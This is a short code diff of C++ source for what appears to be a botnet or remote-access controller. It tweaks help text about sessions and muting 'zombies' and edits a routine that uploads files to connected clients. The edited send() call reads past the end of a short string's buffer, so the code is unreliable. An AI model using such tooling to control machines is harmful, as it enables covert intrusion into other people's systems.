@@ -56,7 +56,7 @@ void Info::print_help()
 	print_status("[ getip\t\t\t: Give the External IP address of the current session");
 	print_status("[ set_session <nb_session>\t: Switch to an another session");
 	print_status("[ list\t\t\t: list all actives sessions");
-	print_status("[ mute <nb>\t\t: Mute a zombie");
+	print_status("[ mute <nb>\t\t\t: Mute a zombie");
 	print_status("[ unmute <nb>\t\t: Unmute a zombie");
 	print_status("[ exit_session <number>\t: Exit a given session");
 	print_status("[ exit\t\t\t: exit the program");
@@ -130,7 +130,6 @@ void Transfer::uploadToClient(Server* serv1,SOCKET& cl_sock, const std::string f
 {
 	print_status("Starting the upload of : "+ filename );
 	char buffer[BUFFER_LEN] = { 0 };
-
 	std::ifstream file(filename, std::ios::binary | std::ios::in);
 	if (file)
 	{
@@ -140,12 +139,14 @@ void Transfer::uploadToClient(Server* serv1,SOCKET& cl_sock, const std::string f
 		
 		print_status(std::to_string(size) + " bytes to send");
 
-		send(cl_sock, std::to_string(size).c_str(), sizeof(size), 0); // SIZE
+		send(cl_sock, std::to_string(size).c_str(), BUFFER_LEN, 0); // SIZE
 
 		int current_size = 0;
 		char memblock[len] = { 0 };
 		const int rest = size % len;
+
 		std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+
 		int nb = 0;
 		file.seekg(0, std::ios::beg);
 		bool done = 0;
